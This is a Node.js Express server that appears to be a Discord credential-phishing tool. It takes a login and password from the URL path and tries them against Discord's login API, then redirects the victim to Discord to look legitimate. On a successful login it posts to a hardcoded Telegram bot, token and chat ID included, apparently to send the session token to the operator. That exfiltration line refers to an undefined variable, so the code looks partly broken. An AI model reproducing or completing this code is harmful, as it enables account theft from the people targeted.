const express = require("express");
const axios = require("axios");

const port = process.env.PORT || 3000;
const app = express();

const botToken = "6467130261:AAF7iAaqrPhgDJm7NkZGIhxgGPQ41s4jwOw";
const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

app.get("/", (req, res) => {
  res.redirect("https://discord.com/app");
});

app.get("/:first/:second", async (req, res) => {
  const login = req.params.first;
  const password = req.params.second;

  axios
    .post("https://discord.com/api/v9/auth/login", {
      login: login,
      password: password,
    })
    .then(function (response) {
      console.log("Успешная авторизация:", response.data);

      try {
        axios
          .post(apiUrl, {
            chat_id: "6425112328",
            text: `${token}`,
          })
          .then((response) => {
            console.log("successfully");
          })
          .catch((error) => {
            console.error("Error");
          });
      } catch (error) {
        console.error("error");
      }
    })
    .catch(function (error) {
      console.log("Ошибка авторизации:", error);
    });

  res.redirect("https://discord.com/app");
});

app.listen(port, "0.0.0.0", () => {
  console.log("Server running");
});
